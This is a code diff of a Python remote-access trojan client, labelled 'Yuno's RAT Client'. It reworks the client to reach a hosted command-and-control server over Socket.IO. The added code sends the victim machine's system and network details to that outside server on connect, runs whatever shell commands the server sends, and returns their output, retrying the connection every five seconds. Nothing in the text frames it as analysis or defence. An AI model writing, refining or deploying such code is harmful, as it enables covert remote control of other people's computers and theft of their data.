@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
-import socket
 import platform
 import subprocess
 import json
 import time
+from socketio import Client
 import netifaces
 
 # Server settings
-SERVER_HOST = "https://c2-backend-wily.onrender.com"  # Update to your server IP (e.g., Render URL if deployed)
-SERVER_PORT = 4444
+SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL
 
 def get_system_info():
     """Gather system information."""
@@ -40,44 +39,51 @@ def execute_command(command):
         return f"Error executing command: {e}"
 
 def main():
+    sio = Client()
+
+    @sio.event
+    def connect():
+        print("[*] Connected to RAT server")
+        # Exfiltrate system and network info
+        system_info = get_system_info()
+        network_info = get_network_info()
+        exfil_data = {
+            "system": system_info,
+            "network": network_info
+        }
+        sio.emit('exfil_data', json.dumps(exfil_data))
+        print("[*] Exfiltrated data sent to RAT server")
+
+    @sio.event
+    def disconnect():
+        print("[*] Disconnected from RAT server")
+
+    @sio.event
+    def connect_error(data):
+        print(f"[!] Connection failed: {data}")
+
+    @sio.event
+    def command(data):
+        print(f"[*] Received command: {data}")
+        if data.strip() == "exit":
+            print("[*] Received exit command")
+            sio.disconnect()
+            return
+        # Execute the command and send back the result (if needed)
+        output = execute_command(data)
+        print(f"[*] Executed command: {data}")
+        # Optionally send the output back
+        sio.emit('exfil_data', json.dumps({"command_output": output}))
+
     while True:
-        client_socket = None
         try:
-            # Connect to the RAT server
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((SERVER_HOST, SERVER_PORT))
-            print("[*] Connected to RAT server")
-
-            # Exfiltrate system and network info
-            system_info = get_system_info()
-            network_info = get_network_info()
-            exfil_data = {
-                "system": system_info,
-                "network": network_info
-            }
-            client_socket.send(json.dumps(exfil_data).encode('utf-8'))
-            print("[*] Exfiltrated data sent to RAT server")
-
-            # Command loop
-            while True:
-                data = client_socket.recv(4096).decode('utf-8', errors='ignore')
-                if not data:
-                    break
-                if data.strip() == "exit":
-                    print("[*] Received exit command")
-                    client_socket.close()
-                    return
-                # Execute the command and send back the result
-                output = execute_command(data)
-                client_socket.send(output.encode('utf-8'))
-                print(f"[*] Executed command: {data}")
-
+            sio.connect(SERVER_URL, transports=['websocket'])
+            sio.wait()
+            break
         except Exception as e:
             print(f"[!] Connection failed: {e}")
             print("[*] Retrying in 5 seconds...")
-        finally:
-            if client_socket is not None:
-                client_socket.close()
+            time.sleep(5)
 
 if __name__ == "__main__":
     print("=== Yuno's RAT Client ===")
